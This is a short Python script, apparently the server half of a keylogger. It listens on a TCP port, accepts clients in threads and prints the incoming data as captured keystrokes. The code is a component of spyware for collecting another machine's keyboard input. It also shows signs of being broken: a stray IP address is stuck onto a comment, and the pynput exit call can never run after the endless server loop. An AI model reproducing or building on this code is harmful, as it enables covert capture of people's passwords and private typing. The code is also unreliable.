import socket
import threading
from pynput import keyboard

# Server address and port102.26.208.73
server_address = ('127.0.0.1', 12345)

def handle_client(client_socket):
    while True:
        data = client_socket.recv(1024)
        if not data:
            break
        key_pressed = data.decode('utf-8')
        print(f"Key pressed: {key_pressed}")

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind(server_address)
        server_socket.listen()

        print(f"Server listening on {server_address[0]}:{server_address[1]}")

        while True:
            client_socket, client_address = server_socket.accept()
            print(f"Accepted connection from {client_address}")
            client_handler = threading.Thread(target=handle_client, args=(client_socket,))
            client_handler.start()

if __name__ == "__main__":
    start_server()
    keyboard.wait('esc')  # Press 'Esc' to exit the program
